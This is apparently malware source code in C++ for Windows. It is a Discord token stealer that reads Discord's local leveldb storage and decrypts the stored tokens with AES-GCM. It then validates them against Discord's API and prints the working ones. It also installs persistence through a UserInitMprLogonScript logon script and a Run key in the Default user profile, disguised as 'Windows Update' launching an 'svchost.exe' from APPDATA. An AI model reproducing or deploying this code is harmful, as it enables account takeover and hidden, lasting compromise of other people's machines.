#include <windows.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <cstdlib>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <iterator>
#include <regex>
#include <string>
#include <vector>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")

using Bytes = std::vector<unsigned char>;

Bytes base64(const std::string& text) {
    DWORD n = 0;
    if (!CryptStringToBinaryA(text.c_str(), 0, CRYPT_STRING_BASE64,
                             nullptr, &n, nullptr, nullptr)) return {};
    Bytes out(n);
    if (!CryptStringToBinaryA(text.c_str(), 0, CRYPT_STRING_BASE64,
                             out.data(), &n, nullptr, nullptr)) return {};
    out.resize(n);
    return out;
}

std::string decrypt(const Bytes& record, const Bytes& secret) {
    if (record.size() < 31 || secret.size() != 32) return {};
    BCRYPT_ALG_HANDLE alg = nullptr;
    BCRYPT_KEY_HANDLE key = nullptr;
    if (BCryptOpenAlgorithmProvider(&alg, L"AES", nullptr, 0) < 0) return {};
    if (BCryptSetProperty(alg, L"ChainingMode", (PUCHAR)L"ChainingModeGCM",
                          sizeof(L"ChainingModeGCM"), 0) < 0) {
        BCryptCloseAlgorithmProvider(alg, 0);
        return {};
    }
    if (BCryptGenerateSymmetricKey(alg, &key, nullptr, 0,
                                  (PUCHAR)secret.data(), secret.size(), 0) < 0) {
        BCryptCloseAlgorithmProvider(alg, 0);
        return {};
    }
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = (PUCHAR)record.data() + 3;
    info.cbNonce = 12;
    info.pbTag = (PUCHAR)record.data() + record.size() - 16;
    info.cbTag = 16;
    Bytes out(record.size());
    ULONG written = 0;
    auto status = BCryptDecrypt(key, (PUCHAR)record.data() + 15,
                                record.size() - 31, &info, nullptr, 0,
                                out.data(), out.size(), &written, 0);
    BCryptDestroyKey(key);
    BCryptCloseAlgorithmProvider(alg, 0);
    if (status < 0) return {};
    return std::string((char*)out.data(), written);
}

bool validate(const std::string& token) {
    auto session = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                               nullptr, nullptr, 0);
    if (!session) return false;
    auto connection = WinHttpConnect(session, L"discord.com", 443, 0);
    auto request = connection ? WinHttpOpenRequest(connection, L"GET",
        L"/api/v9/users/@me", nullptr, nullptr, nullptr, WINHTTP_FLAG_SECURE) : nullptr;
    bool ok = false;
    if (request) {
        std::wstring header = L"Authorization: " + std::wstring(token.begin(), token.end());
        if (WinHttpSendRequest(request, header.c_str(), -1L, nullptr, 0, 0, 0) &&
            WinHttpReceiveResponse(request, nullptr)) {
            DWORD status = 0, n = sizeof(status);
            ok = WinHttpQueryHeaders(request,
                WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                nullptr, &status, &n, nullptr) && status == 200;
        }
        WinHttpCloseHandle(request);
    }
    if (connection) WinHttpCloseHandle(connection);
    WinHttpCloseHandle(session);
    return ok;
}

bool logon_script(const std::wstring& script, const std::wstring& image) {
    std::ofstream file{std::filesystem::path(script)};
    file << "@echo off\r\nstart \"\" \""
         << std::filesystem::path(image).string() << "\"\r\n";
    file.close();
    if (!file) return false;
    HKEY key = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0, KEY_SET_VALUE, &key)) return false;
    auto result = RegSetValueExW(key, L"UserInitMprLogonScript", 0, REG_SZ,
        (const BYTE*)script.c_str(), (script.size() + 1) * sizeof(wchar_t));
    RegCloseKey(key);
    return result == ERROR_SUCCESS;
}

bool default_profile(const std::wstring& image) {
    // RegLoadKey requires the caller's backup/restore privileges to be enabled.
    if (RegLoadKeyW(HKEY_USERS, L"ProfileSeed", L"C:\\Users\\Default\\NTUSER.DAT")) return false;
    HKEY key = nullptr;
    auto result = RegOpenKeyExW(HKEY_USERS,
        L"ProfileSeed\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key);
    if (result == ERROR_SUCCESS) {
        std::wstring command = L"\"" + image + L"\"";
        result = RegSetValueExW(key, L"Windows Update", 0, REG_EXPAND_SZ,
            (const BYTE*)command.c_str(), (command.size() + 1) * sizeof(wchar_t));
        RegCloseKey(key);
    }
    auto unload = RegUnLoadKeyW(HKEY_USERS, L"ProfileSeed");
    return result == ERROR_SUCCESS && unload == ERROR_SUCCESS;
}

int main(int argc, char** argv) {
    if (argc < 2) return 1;
    const char* appdata = std::getenv("APPDATA");
    if (!appdata) return 1;
    if (std::string(argv[1]) == "persist") {
        wchar_t self[MAX_PATH];
        if (!GetModuleFileNameW(nullptr, self, MAX_PATH)) return 1;
        auto script = std::filesystem::path(appdata) / "Microsoft" / "logon.cmd";
        return logon_script(script.wstring(), self) &&
            default_profile(L"%APPDATA%\\Microsoft\\svchost.exe") ? 0 : 1;
    }
    Bytes secret;
    std::string hex = argv[1];
    if (hex.size() != 64) return 1;
    for (size_t i = 0; i < hex.size(); i += 2)
        secret.push_back((unsigned char)std::stoul(hex.substr(i, 2), nullptr, 16));
    auto store = std::filesystem::path(appdata) / "discord\\Local Storage\\leveldb";
    const std::regex pattern("dQw4w9WgXcQ:([A-Za-z0-9+/=]+)");
    for (const auto& entry : std::filesystem::directory_iterator(store)) {
        auto ext = entry.path().extension();
        if (ext != ".ldb" && ext != ".log") continue;
        std::ifstream file(entry.path(), std::ios::binary);
        std::string text((std::istreambuf_iterator<char>(file)), {});
        for (auto it = std::sregex_iterator(text.begin(), text.end(), pattern);
             it != std::sregex_iterator(); ++it) {
            auto token = decrypt(base64((*it)[1].str()), secret);
            if (!token.empty() && validate(token)) std::cout << token << '\n';
        }
    }
}
